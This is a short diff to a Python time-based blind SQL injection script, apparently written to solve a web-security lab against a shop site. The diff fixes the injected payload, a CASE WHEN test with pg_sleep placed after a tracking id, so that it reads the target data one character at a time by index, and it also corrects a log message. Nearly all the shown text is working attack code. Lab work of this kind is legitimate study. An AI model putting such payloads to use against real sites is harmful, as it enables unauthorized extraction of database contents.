@@ -35,7 +35,7 @@ class MySQLi(SQLi):
     def format_char_query(self, inner_query, index, char):
         return(
             f"{self.tracking_id}'||(SELECT CASE WHEN ("
-            f"(select SUBSTRING(({inner_query}),1,1))=chr({char})"
+            f"(select SUBSTRING(({inner_query}),{index},1))=chr({char})"
             ") THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
     def is_true(self, resp, duration):
@@ -57,7 +57,7 @@ class MySQLi(SQLi):
 def main(args):
     session = requests.Session()
     shop = Shop(args.url, args.no_proxy, session)
-    log.info("Getting tracking id and session tocen.")
+    log.info("Getting tracking id and session tocken.")
     if args.no_proxy:
         resp = requests.get(shop.base_url)
     else:
